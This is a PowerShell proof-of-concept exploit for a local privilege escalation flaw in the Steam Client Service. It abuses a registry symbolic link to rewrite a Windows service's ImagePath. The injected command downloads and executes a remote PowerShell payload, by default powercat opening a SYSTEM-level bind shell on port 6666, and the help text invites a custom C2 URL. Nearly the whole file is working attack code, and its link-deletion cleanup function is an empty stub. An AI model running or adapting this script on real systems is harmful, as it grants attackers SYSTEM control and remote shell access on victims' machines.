<#
.SYNOPSIS
This Powershell script is a POC for Steam Local Privilege Elevation as reported by @PsiDragon
Source : https://amonitoring.ru/article/steamclient-0day/
.DESCRIPTION
Please see the above link for in depth technical, but basically, uses a loophole in the Steam local
service startup process that (blindly) change permissions on registry keys without checking for potential 
symbolic links to achieve NT AUTHORITY\SYSTEM execution of arbitrary payload. 
Please be aware that this script modifies the registry and therefore can cause instability, please use at 
your own risk on a controlled environment
.EXAMPLE 
.\exploit.ps1
Will run the exploit with default options
.EXAMPLE 
.\exploit.ps1 -Payload https://INSERT_YOUR_C2_HERE/payload.ps1 -TargetSvc msiserver
Will overwrite the specified target service ImagePath with a new payload
.EXAMPLE 
.\exploit.ps1 -Restore
Restore modified registry keys
#>

[CmdletBinding()]
Param(	
    # A target payload to download and run
    [string]$PayloadUrl = "https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1",
    # Cmdline options for the aforementioned payload
    [string]$PayloadExec = "powercat -l -p 6666 -e %systemroot%\System32\cmd.exe",
    # Target service to overwrite
    [string]$TargetSvc = "msiserver",
    # Backup ImagePath name
    [string]$ImagePathBackupKey = "ImagePressure",
    # Revert modifications on target service
    [switch]$Restore
)

# ----------------------------------------------------------------------------------------------------------------
#region Native API Definitions
# ----------------------------------------------------------------------------------------------------------------
Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;

	[StructLayout(LayoutKind.Sequential)]
	public struct UNICODE_STRING
	{
		public UInt16 Length;
		public UInt16 MaximumLength;
		public IntPtr Buffer;
    }
    [StructLayout(LayoutKind.Sequential)]
	public struct OBJECT_ATTRIBUTES
	{
		public Int32 Length;
		public IntPtr RootDirectory;
		public IntPtr ObjectName;
		public UInt32 Attributes;
		public IntPtr SecurityDescriptor;
		public IntPtr SecurityQualityOfService;
	}
    public static class Ntdll {
    
        [DllImport("ntdll.dll")]
        public static extern UInt32 NtCreateKey(
            ref IntPtr KeyHandle,
            UInt32 DesiredAccess,
            ref OBJECT_ATTRIBUTES ObjAttr,
            UInt32 TitleIndex,
            IntPtr Class,
            UInt32 CreateOptions,
            ref UInt32 Disposition);
        
        [DllImport("ntdll.dll")]
        public static extern UInt32 NtSetValueKey(
            IntPtr KeyHandle,
            IntPtr ValueName,
            UInt32 TitleIndex,
            UInt32 Type,
            IntPtr Data,
            UInt32 DataSize);    

        [DllImport("ntdll.dll")]
        public static extern UInt32 NtDeleteKey(
            IntPtr KeyHandle); 
            
        [DllImport("ntdll.dll")]
        public static extern UInt32 NtClose(
            IntPtr Handle);  
    }
"@

# ----------------------------------------------------------------------------------------------------------------
#region Helper funcs
# ----------------------------------------------------------------------------------------------------------------
  <#
  .SYNOPSIS
  Display some fancy banner for the kicks
  #>
  Function Show-Banner 
  {
      Write-Host "-------------------------------------------------------------------------------"
      Write-Host "__________                                                    ____ _           "
      Write-Host "\______   \_______   ____   ______ ________ _________   ____ |    |   \______  " 
      Write-Host " |     ___/\_  __ \_/ __ \ /  ___//  ___/  |  \_  __ \_/ __ \|    |   /\____ \ "
      Write-Host " |    |     |  | \/\  ___/ \___ \ \___ \|  |  /|  | \/\  ___/|    |  / |  |_> >"
      Write-Host " |____|     |__|    \___  >____  >____  >____/ |__|    \___  >______/  |   __/ "
      Write-Host "                        \/     \/     \/                   \/          |__|    "
      Write-Host "-------------------------------------------------------------------------------"
  }

  <#
  .SYNOPSIS
  Create, fill and return UNICODE_STRING struct using a given string
  .PARAMETER Data
  The string to be converted
  #>
function New-UNICODE_STRING {
    param(
        [String]$Data
    )

    $UnicodeObject = New-Object UNICODE_STRING
    $UnicodeObject_Buffer = $Data
    [UInt16]$UnicodeObject.Length = $UnicodeObject_Buffer.Length*2
    [UInt16]$UnicodeObject.MaximumLength = $UnicodeObject.Length+1
    #[IntPtr]$UnicodeObject.Buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($UnicodeObject_Buffer)
    [IntPtr]$UnicodeObject.Buffer = [System.Runtime.InteropServices.Marshal]::StringToCoTaskMemUni($UnicodeObject_Buffer)
    [IntPtr]$InMemoryStruct = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(16) # enough for x32/x64
    [system.runtime.interopservices.marshal]::StructureToPtr($UnicodeObject, $InMemoryStruct, $true)

    $InMemoryStruct
}



  <#
  .SYNOPSIS
  Set various Win32 constants
  #>
Function Get-Win32Constants
{
    $Win32Constants = New-Object System.Object

    $Win32Constants | Add-Member -MemberType NoteProperty -Name KEY_QUERY_VALUE                 -Value 0x0001
    $Win32Constants | Add-Member -MemberType NoteProperty -Name KEY_SET_VALUE                   -Value 0x0002
    $Win32Constants | Add-Member -MemberType NoteProperty -Name KEY_CREATE_SUB_KEY              -Value 0x0004
    $Win32Constants | Add-Member -MemberType NoteProperty -Name KEY_ENUMERATE_SUB_KEYS          -Value 0x0008
    $Win32Constants | Add-Member -MemberType NoteProperty -Name KEY_NOTIFY                      -Value 0x0010
    $Win32Constants | Add-Member -MemberType NoteProperty -Name KEY_CREATE_LINK                 -Value 0x0020
    $Win32Constants | Add-Member -MemberType NoteProperty -Name KEY_WOW64_64KEY                 -Value 0x0100
    $Win32Constants | Add-Member -MemberType NoteProperty -Name KEY_WOW64_32KEY                 -Value 0x0200
    $Win32Constants | Add-Member -MemberType NoteProperty -Name KEY_WRITE                       -Value 0x20006    
    $Win32Constants | Add-Member -MemberType NoteProperty -Name KEY_READ                        -Value 0x20019    
    $Win32Constants | Add-Member -MemberType NoteProperty -Name KEY_EXECUTE                     -Value 0x20019    
    $Win32Constants | Add-Member -MemberType NoteProperty -Name KEY_ALL_ACCESS                  -Value 0xF003F    

    $Win32Constants | Add-Member -MemberType NoteProperty -Name OBJ_INHERIT                     -Value 0x00000002
    $Win32Constants | Add-Member -MemberType NoteProperty -Name OBJ_PERMANENT                   -Value 0x00000010
    $Win32Constants | Add-Member -MemberType NoteProperty -Name OBJ_EXCLUSIVE                   -Value 0x00000020
    $Win32Constants | Add-Member -MemberType NoteProperty -Name OBJ_CASE_INSENSITIVE            -Value 0x00000040
    $Win32Constants | Add-Member -MemberType NoteProperty -Name OBJ_OPENIF                      -Value 0x00000080
    $Win32Constants | Add-Member -MemberType NoteProperty -Name OBJ_OPENLINK                    -Value 0x00000100
    $Win32Constants | Add-Member -MemberType NoteProperty -Name OBJ_KERNEL_HANDLE               -Value 0x00000200
    $Win32Constants | Add-Member -MemberType NoteProperty -Name OBJ_FORCE_ACCESS_CHECK          -Value 0x00000400
    $Win32Constants | Add-Member -MemberType NoteProperty -Name OBJ_VALID_ATTRIBUTES            -Value 0x000007f2
    
    $Win32Constants | Add-Member -MemberType NoteProperty -Name REG_OPTION_NON_VOLATILE         -Value 0x00000000
    $Win32Constants | Add-Member -MemberType NoteProperty -Name REG_OPTION_VOLATILE             -Value 0x00000001
    $Win32Constants | Add-Member -MemberType NoteProperty -Name REG_OPTION_CREATE_LINK          -Value 0x00000002
    $Win32Constants | Add-Member -MemberType NoteProperty -Name REG_OPTION_OPEN_LINK            -Value 0x00000100

    $Win32Constants | Add-Member -MemberType NoteProperty -Name REG_NONE                        -Value 0x00000000
    $Win32Constants | Add-Member -MemberType NoteProperty -Name REG_SZ                          -Value 0x00000001
    $Win32Constants | Add-Member -MemberType NoteProperty -Name REG_EXPAND_SZ                   -Value 0x00000002
    $Win32Constants | Add-Member -MemberType NoteProperty -Name REG_BINARY                      -Value 0x00000003
    $Win32Constants | Add-Member -MemberType NoteProperty -Name REG_DWORD                       -Value 0x00000004
    $Win32Constants | Add-Member -MemberType NoteProperty -Name REG_DWORD_LITTLE_ENDIAN         -Value 0x00000004
    $Win32Constants | Add-Member -MemberType NoteProperty -Name REG_DWORD_BIG_ENDIAN            -Value 0x00000005
    $Win32Constants | Add-Member -MemberType NoteProperty -Name REG_LINK                        -Value 0x00000006
    $Win32Constants | Add-Member -MemberType NoteProperty -Name REG_MULTI_SZ                    -Value 0x00000007
    $Win32Constants | Add-Member -MemberType NoteProperty -Name REG_RESOURCE_LIST               -Value 0x00000008
    $Win32Constants | Add-Member -MemberType NoteProperty -Name REG_FULL_RESOURCE_DESCRIPTOR    -Value 0x00000009
    $Win32Constants | Add-Member -MemberType NoteProperty -Name REG_RESOURCE_REQUIREMENTS_LIST  -Value 0x00000010
    $Win32Constants | Add-Member -MemberType NoteProperty -Name REG_QWORD                       -Value 0x00000011
    $Win32Constants | Add-Member -MemberType NoteProperty -Name REG_QWORD_LITTLE_ENDIAN         -Value 0x00000011


    return $Win32Constants
}
 <#
  .SYNOPSIS
  Delete a registry symbolic link
#>
Function Invoke-RegDeleteLink
 {}

<#
  .SYNOPSIS
  Create a registry symbolic link
#>
Function Invoke-RegCreateLink
{
    Param(
        # Win32 constants struct
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        # Registry path to be created (Ntdll format, ie : "\Registry\Machine\SOFTWARE\WOW6432Node\...")
        [Parameter(Position = 2, Mandatory = $true)]
        [System.String]
        $SourcePath,
        # Registry path to be linked to (Ntdll format, ie : "\Registry\Machine\SOFTWARE\WOW6432Node\...")
        [Parameter(Position = 3, Mandatory = $true)]
        [System.String]
        $DestinationPath
    )

    $KeyHandle = [IntPtr]::Zero
    $DesiredAccess = $Win32Constants.KEY_ALL_ACCESS
    $CreateOptions = ($Win32Constants.REG_OPTION_NON_VOLATILE -bor $Win32Constants.REG_OPTION_CREATE_LINK)
    $Disposition = 0
    $NtValueName = New-UNICODE_STRING -Data "SymbolicLinkValue"
    
    # Create OBJECT_ATTRIBUTES structure
    $ObjectAttributes = New-Object OBJECT_ATTRIBUTES
    $ObjectAttributes.Length         = [System.Runtime.InteropServices.Marshal]::SizeOf($ObjectAttributes)
    $ObjectAttributes.RootDirectory  = [IntPtr]::Zero
    $ObjectAttributes.Attributes     = $Win32Constants.OBJ_CASE_INSENSITIVE
    $ObjectAttributes.ObjectName     = New-UNICODE_STRING -Data $SourcePath
    $ObjectAttributes.SecurityDescriptor       = [IntPtr]::Zero
    $ObjectAttributes.SecurityQualityOfService = [IntPtr]::Zero

    # Create the new SourcePath key
    $NtStatus = [Ntdll]::NtCreateKey([ref]$KeyHandle, 
                                        $DesiredAccess,
                                        [ref]$ObjectAttributes,
                                        0,
                                        [IntPtr]::Zero, 
                                        $CreateOptions, 
                                        [ref]$Disposition)
    if ($NtStatus -eq 0) {
        # If successful, set it as a link 
        # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/d5ce9dcc-1f90-4f5a-b076-cc1d2c9b4195
        $NtStatus = [Ntdll]::NtSetValueKey($KeyHandle, 
                                            $NtValueName,
                                            0,
                                            $Win32Constants.REG_LINK,
                                            [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($DestinationPath),
                                            $DestinationPath.Length*2)
        if ($NtStatus -eq 0) {
            # If successful, close our handle
            $NtStatus = [Ntdll]::NtClose($KeyHandle)
        } else {
            Write-Error "Failed to set link value [$DestinationPath] with NTSTATUS($('{0:X}' -f $NtStatus))"
        }
    } else {
        Write-Error "Failed to Create key [$SourcePath] with NTSTATUS($('{0:X}' -f $NtStatus))"
    }        
}

# ----------------------------------------------------------------------------------------------------------------
#region Main
# ----------------------------------------------------------------------------------------------------------------
Show-Banner

$binary_cmd = 'cmd.exe /c powershell.exe -exec bypass -c "IEX(New-Object System.Net.WebClient).DownloadString('
#Get Win32 constants (from : https://github.com/PowerShellMafia/PowerSploit)
$Win32Constants = Get-Win32Constants

Write-Host -NoNewline "Locating steam service... "
if (Get-Service "Steam Client Service") {
    Write-Host "Found" -ForegroundColor Green
    # Generate a random name
    $rndname = [system.IO.Path]::GetRandomFileName()
    $linkname = $rndname.Substring(0, $rndname.IndexOf("."))
    $steamregpath = "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam\Apps\$linkname"
    Write-Host -NoNewline "Creating symlink to $TargetSvc..."
    # Create a symlink in SteamApps to msiserver (running with Local Authority / Not user writable)
    Invoke-RegCreateLink $Win32Constants "\Registry\Machine\SOFTWARE\WOW6432Node\Valve\Steam\Apps\$linkname" "\Registry\Machine\SYSTEM\ControlSet001\Services\$TargetSvc"
    # Make sure the registry key exists
    if (Test-Path $steamregpath) {
        Write-Host "Ok [$linkname]" -ForegroundColor Green 
        # Restart steam client service
        Write-Host "Restarting Steam service"
        Restart-Service "Steam Client Service"
        # Wait service magic 
        Write-Host -NoNewline "Waiting"
        Start-Sleep -s 3
        Write-Host -NoNewline "."
        Start-Sleep -s 2
        Write-Host -NoNewline "."
        Start-Sleep -s 1
        Write-Host "."
        # Update ImagePath
        Write-Host -NoNewline "Updating ImagePath for $TargetSvc..."
        
        # Check for ImagePressure backup key and revert it (multiple execution)
        $regkey = Get-Item -Path $steamregpath
        if ($regkey.GetValue($ImagePathBackupKey)) {
            $imagepath_backup = Get-ItemPropertyValue $steamregpath -Name $ImagePathBackupKey 
            Set-ItemProperty -Path $steamregpath -Name "ImagePath" $imagepath_backup
        }
        if ($PSBoundParameters.ContainsKey('Restore')) {
            # Remove backup key and stop processing
            if ($imagepath_backup) {
                Write-Host "Restored" -ForegroundColor Green
                Remove-ItemProperty -Path $steamregpath -Name $ImagePathBackupKey  
                # Remove link 
                Invoke-RegDeleteLink "\Registry\Machine\SOFTWARE\WOW6432Node\Valve\Steam\Apps\$linkname"                   
            } else {}
        } else {
            # Create a backup of existing image path value
            $imagepath_backup = Get-ItemPropertyValue $steamregpath -Name "ImagePath"
            Set-ItemProperty -Path $steamregpath -Name $ImagePathBackupKey $imagepath_backup
            # Create the new payload string and update image path 
            $payload = "$binary_cmd '$PayloadUrl');$PayloadExec" + '"' 
            Set-ItemProperty -Path $steamregpath -Name "ImagePath" $payload
            # Make sure we've been able to update it 
            $imagepath = Get-ItemPropertyValue $steamregpath -Name "ImagePath"
            if ($imagepath_backup -ne $imagepath) {
                # Remove link 
                Invoke-RegDeleteLink "\Registry\Machine\SOFTWARE\WOW6432Node\Valve\Steam\Apps\$linkname" 
                # Launch the service 
                Write-Host "Pwnd ! " -ForegroundColor Green
                Write-Host "Running $payload for about 10s" -ForegroundColor Green
                if (-not $PSBoundParameters.ContainsKey('PayloadUrl')) {
                    Write-Host "Connect using nc.exe 127.0.0.1 6666" -ForegroundColor Green
                }
                Start-Service $TargetSvc
            } else {
                Write-Error "Unable to update $TargetSvc ImagePath :(" 
            }
        }
    } else {
        Write-Error "Key: $steamregpath not found" 
    }
} else {
    Write-Error "Steam Client Service isn't installed or registered...bailing out"
}